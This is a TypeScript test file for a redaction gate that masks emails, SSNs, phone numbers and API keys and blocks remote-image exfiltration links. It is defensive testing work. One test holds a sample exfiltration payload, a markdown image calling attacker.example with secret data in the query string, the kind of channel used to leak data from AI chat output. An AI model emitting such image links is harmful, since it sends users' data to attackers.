import { test } from 'node:test'
import assert from 'node:assert/strict'
import { floorGate } from './gate.ts'

test('floor gate masks every structured PII/secret kind', () => {
  const r = floorGate('email jane@acme.com ssn 123-45-6789 phone 415-555-0199 key sk-ABCDEFGHIJKLMNOPqrstuvwx')
  assert.ok(!r.redacted.includes('jane@acme.com'))
  assert.ok(!r.redacted.includes('123-45-6789'))
  assert.ok(!r.redacted.includes('415-555-0199'))
  assert.ok(!r.redacted.includes('sk-ABCDEFGHIJKLMNOP'))
  assert.ok(/\[EMAIL_1\]/.test(r.redacted) && /\[SSN_1\]/.test(r.redacted) && /\[APIKEY_1\]/.test(r.redacted))
  assert.ok(r.findings.piiCount >= 4)
})

test('floor gate neutralises the remote-image exfil channel and reports the url', () => {
  const r = floorGate('look ![x](https://attacker.example/c?d=supersecretpayload)')
  assert.ok(!r.redacted.includes('attacker.example'))
  assert.ok(r.redacted.includes('[remote image blocked]'))
  assert.ok(r.findings.exfilUrls.some((u) => u.includes('attacker.example')))
})

test('floor gate exposes no reversal mapping', () => {
  const r = floorGate('ssn 123-45-6789') as unknown as Record<string, unknown>
  assert.equal('mapping' in r, false)
})

test('already-masked text is a no-op (idempotent — safe to run twice)', () => {
  const once = floorGate('email a@b.com').redacted
  const twice = floorGate(once).redacted
  assert.equal(once, twice)
})
